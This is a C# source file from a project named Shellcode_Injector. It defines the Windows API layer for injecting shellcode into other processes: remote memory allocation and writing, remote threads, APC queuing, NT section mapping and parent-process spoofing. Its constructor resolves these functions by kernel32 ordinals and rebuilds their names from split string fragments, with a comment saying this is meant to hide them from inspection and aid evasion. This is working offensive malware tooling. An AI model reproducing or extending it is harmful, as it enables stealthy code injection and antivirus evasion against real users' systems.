using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using static Shellcode_Injector.WinApi;

namespace Shellcode_Injector
{
    internal class WinApi
    {
        //enums to hold static values
        public enum mem : uint
        {
            rwx = 0x40,        //PAGE_EXECUTE_READWRITE
            rw = 0x04,         //PAGE_READ_WRITE
            rx = 0x20,         //PAGE_READ_EXECUTE
            cmt_rv = 0x3000,   //MEM_COMMIT_RESERVE
            end = 0xFFFFFFFF
        }
        
        public enum gen : ulong
        { 
            sec_accs = 0x10000000,     // Section all access
            sec_cmt = 0x08000000,      // Section commit
            thr_accs = 0x001F0000      // STANDARD_RIGHTS_ALL
        }

        public enum proc : uint
        { 
            sspnd = 0x00000004,   // CREATE_SUSPENDED
            extinf = 0x00080000   // EXTENDED_STARTUPINFO_PRESENT
        }
        public enum ntstat : uint
        {
            success = 0,
            denied = 0xC0000022,
        }

        // Struct definitions
        // Extended STARTUP_INFORMATION
        public struct SINEX
        {
            public SIN StartupInfo;
            public IntPtr lpAttributeList;
        }

        // PROC_THREAD_ATTRIBUTE_LIST
        public struct PTHATTR
        {
            public uint dwFlags;
            public IntPtr lpThreadAttributeList;
            public UIntPtr Size;
            public IntPtr lpDummy;
        }

        // PARENT_PROCESS
        public struct PPROC
        {
            public IntPtr hParentProcess;
            public IntPtr hConsole;
        }

        // STARTUP_INFORMATION
        [StructLayout(LayoutKind.Sequential)]
        public struct SIN
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        //PROCESS_INFORMATION
        [StructLayout(LayoutKind.Sequential)]
        public struct PIN
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        //SECURITY_ATTRIBUTES
        [StructLayout(LayoutKind.Sequential)]
        public struct SATTR
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }


        // PInvoke definitions 
        [DllImport("kernel32", EntryPoint = "#969", SetLastError = true)]
        // LoadLibraryA, ordinal from Win10
        // .\dumpbin.exe /exports C:\Windows\System32\kernel32.dll |select-string -pattern LoadLibraryA
        private static extern IntPtr LLA(string lname);

        [DllImport("kernel32", EntryPoint = "#697", SetLastError = true)]
        // GetProcAddress, ordinal from Win10
        // .\dumpbin.exe /exports C:\Windows\System32\kernel32.dll |select-string -pattern GetProcAddress
        private static extern IntPtr GPA(IntPtr lhand, string addr);



        //Kernel32.dll Delegation definitions
        //VirtualAllocEx - hProcess, LpAddress, dwSize, flAllocationType, flProtect
        public delegate IntPtr VAE(IntPtr hproc, IntPtr addr, uint size, uint aloc, uint prot);

        //WriteProcessMemory - hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten
        public delegate bool WPM(IntPtr hproc, IntPtr addr, byte[] buf, uint size, out int bwrite);

        //VirtualProtectEx - hProcess, lpAddress, dwSize, flAllocationType, flProtect
        public delegate bool VPE(IntPtr hproc, IntPtr addr, int size, uint aloc, out uint prot);

        //CreateRemoteThread - hProcess, sec_attrs, size, startHere, params, zero, id
        public delegate IntPtr CRT(IntPtr hproc, IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, IntPtr ID);

        //WaitForSingleObject - value, value2
        public delegate uint WFSO(IntPtr val, uint val2);

        //QueueUserAPC - IntPtr MemoryAddr, IntPtr main_thread_handle, uint 0
        public delegate uint QUA(IntPtr addr, IntPtr mthr, uint data);

        //ResumeThread - IntPtr thread_handle
        public delegate void RTH(IntPtr thand);

        //CreateProcessW - string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        // ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        //    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
        public delegate bool CPW(
            [MarshalAs(UnmanagedType.LPWStr)] string app,
            [MarshalAs(UnmanagedType.LPWStr)] string cmd, 
            ref SATTR proc_attr,
            ref SATTR thread_attr, 
            bool inh_hand, 
            uint cflags, 
            IntPtr env,
            [MarshalAs(UnmanagedType.LPWStr)]  string cwd, 
            ref SINEX str_info, 
            out PIN proc_info);

        //OpenProcess - dwDesiredAccess, bInheritHandle, dwProcessId
        public delegate IntPtr OP(uint access, bool ihand, uint pid);

        //InitializeProcThreadAttributeList - IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize
        public delegate bool IPTA(IntPtr lpatt, int count, int dflag, ref IntPtr size);

        //UpdateProcThreadAttribute - IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        //IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize
        public delegate bool UPTA(IntPtr lpatt, uint dflag, IntPtr att, ref PPROC lval, IntPtr size, IntPtr pval, IntPtr rsize);

        //DeleteProcThreadAttributeList - IntPtr lpAttributeList
        public delegate void DPTA(IntPtr lpatt);


        //ntdll.dll delegation definitions
        //NtCreateSection - out hSection, ulong desired_access, IntPtr object_attributes,
        //ulong max_size, ulong page_attributes, ulong section_attributes, IntPtr file_handle
        public delegate void NCS(ref IntPtr hSection, ulong daccess, 
            IntPtr oattr, ref ulong size, ulong pattr, ulong sattr,
            IntPtr fhand);

        //NtMapViewOfSection - SectionHandle, ProcHandle, *BaseAddress, ZeroBits, CommitSize, SectionOffset,
        //ViewSize, InheritDisposition, AllocationType, Protect
        public delegate void NMVS(IntPtr hSection, IntPtr phand, out 
            IntPtr addr, IntPtr zbits, IntPtr csize, IntPtr soff, 
            out ulong vsize, uint idisps, uint alloctype, 
            uint protect);

        //NtCreateThreadEx - out IntPtr hthread, ulong desired_access, IntPtr ObjectAttributes, 
        //IntPtr ProcessHandle, IntPtr RemoteBaseAddress, IntPtr lpParameter, bool CreateSuspended,
        //int StackZeroBits, int SizeOfStackCommit, int SizeOfStackReserve, IntPtr ThreadInfo
        public delegate void NCTE(out IntPtr hth, ulong daccess, IntPtr oattr, 
            IntPtr phand, IntPtr remoteaddr, IntPtr lparam, 
            bool suspend, int szbits, int sc_size, 
            int sr_size, IntPtr tinfo);

        //NtQueueApcThread - ThreadHandle, ApcRoutine, ApcRoutineContext, ApcStatusBlock,ApcReserved
        public delegate ntstat NQAT(IntPtr thand, IntPtr addr, IntPtr p1, IntPtr p2, IntPtr p3);



        //Hidden functions that will be directly used, maybe change names at some point
        public static VAE Allocate { get; private set; } 
        public static VPE Protect { get; private set; }
        public static CRT RemoteThread { get; private set; }
        public static WPM WriteMem { get; private set; }
        public static WFSO Waiter { get; private set; }
        public static CPW Starter { get; private set; }
        public static RTH Resume { get; private set; }
        public static QUA APC { get; private set; }
        public static NCS cSection { get; private set; }
        public static NMVS mvSection { get; private set; }
        public static NCTE cThread { get; private set; }
        public static NQAT NAPC { get; private set; } 
        public static IPTA InitAtt { get; private set; }
        public static UPTA UpdateAtt { get; private set; }
        public static DPTA DelAtt { get; private set; }
        public static OP OpenP { get; private set; }


        //Constructor which will initialize the static methods to be used.
        public WinApi() 
        {
            //Small obfuscation to not show the names if exe is inspected with strings
            //dont know if its actually helpfull for evasion :D
            var mymap = new Dictionary<string, List<string>>();
            mymap.Add("ml", new List<string> { "k", "er", "ne", "l3", "2.d", "ll" });
            mymap.Add("sl", new List<string> { "n", "td", "l", "l.", "d", "ll"});
            mymap.Add("vae", new List<string> { "Vi", "rtu", "alA", "llo", "cEx" });
            mymap.Add("vpe", new List<string> { "V", "irt", "ual", "Pr", "ote", "ctEx" });
            mymap.Add("crt", new List<string> { "Cr", "eat", "eRe", "mot", "eTh", "read" });
            mymap.Add("wfso", new List<string> { "Wa", "itF", "orS", "ingl", "eOb", "ject" });
            mymap.Add("wpm", new List<string> { "W", "ri", "te", "Pr", "oce", "ssMe", "mory" });
            mymap.Add("cpw", new List<string> { "Cr","e", "ate", "P", "roc", "es", "sW"});
            mymap.Add("rth", new List<string> { "R", "es", "u", "meTh", "read"});
            mymap.Add("qua", new List<string> { "Q", "ue", "ueU", "serA", "PC" });
            mymap.Add("ncs", new List<string> { "N", "tC", "rea", "teS", "ec", "tion" });
            mymap.Add("nmvs", new List<string> { "N", "tMap", "Vi", "ewO", "fSe", "ct", "ion" });
            mymap.Add("ncte", new List<string> { "N", "tCr", "eat", "eTh", "read", "Ex" });
            mymap.Add("nqat", new List<string> { "N", "tQ", "ue", "ueA", "pc", "Th","read" });
            mymap.Add("ipta", new List<string> { "In", "iti", "ali", "zeP", "roc", "Th", "read", "Att", "ribu", "teL", "ist" });
            mymap.Add("upta", new List<string> { "Up", "date", "Pr", "ocTh", "read", "At", "trib", "ute" });
            mymap.Add("dpta", new List<string> { "Del", "ete", "Pr", "ocT", "hread", "At", "tri", "buteL", "ist" });
            mymap.Add("op", new List<string> { "Op", "enP", "roc", "ess" });


            //Get function pointers trough LoadLibraryA and GetProcAddress
            IntPtr main_lib = LLA(string.Join("", mymap["ml"]));
            IntPtr sec_lib = LLA(string.Join("", mymap["sl"]));
            IntPtr p1 = GPA(main_lib, string.Join("", mymap["vae"]));
            IntPtr p2 = GPA(main_lib, string.Join("", mymap["vpe"]));
            IntPtr p3 = GPA(main_lib, string.Join("", mymap["wpm"]));
            IntPtr p4 = GPA(main_lib, string.Join("", mymap["crt"]));
            IntPtr p5 = GPA(main_lib, string.Join("", mymap["wfso"]));
            IntPtr p6 = GPA(main_lib, string.Join("", mymap["cpw"]));
            IntPtr p7 = GPA(main_lib, string.Join("", mymap["rth"]));
            IntPtr p8 = GPA(main_lib, string.Join("", mymap["qua"]));
            IntPtr p9 = GPA(sec_lib, string.Join("", mymap["ncs"]));
            IntPtr p10 = GPA(sec_lib, string.Join("", mymap["nmvs"]));
            IntPtr p11 = GPA(sec_lib, string.Join("", mymap["ncte"]));
            IntPtr p12 = GPA(sec_lib, string.Join("", mymap["nqat"]));
            IntPtr p13 = GPA(main_lib, string.Join("", mymap["ipta"]));
            IntPtr p14 = GPA(main_lib, string.Join("", mymap["upta"]));
            IntPtr p15 = GPA(main_lib, string.Join("", mymap["dpta"]));
            IntPtr p16 = GPA(main_lib, string.Join("", mymap["op"]));


            //Set the delegated functions that will be used
            Allocate = Marshal.GetDelegateForFunctionPointer<VAE>(p1);
            Protect = Marshal.GetDelegateForFunctionPointer<VPE>(p2);
            RemoteThread = Marshal.GetDelegateForFunctionPointer<CRT>(p4);
            WriteMem = Marshal.GetDelegateForFunctionPointer<WPM>(p3);
            Waiter = Marshal.GetDelegateForFunctionPointer<WFSO>(p5);
            Starter = Marshal.GetDelegateForFunctionPointer<CPW>(p6);
            Resume = Marshal.GetDelegateForFunctionPointer<RTH>(p7);
            APC = Marshal.GetDelegateForFunctionPointer<QUA>(p8);
            cSection = Marshal.GetDelegateForFunctionPointer<NCS>(p9);
            mvSection = Marshal.GetDelegateForFunctionPointer<NMVS>(p10);
            cThread = Marshal.GetDelegateForFunctionPointer<NCTE>(p11);
            NAPC = Marshal.GetDelegateForFunctionPointer<NQAT>(p12);
            InitAtt = Marshal.GetDelegateForFunctionPointer<IPTA>(p13);
            UpdateAtt = Marshal.GetDelegateForFunctionPointer<UPTA>(p14);
            DelAtt = Marshal.GetDelegateForFunctionPointer<DPTA>(p15);
            OpenP = Marshal.GetDelegateForFunctionPointer<OP>(p16);
        }
    }
}
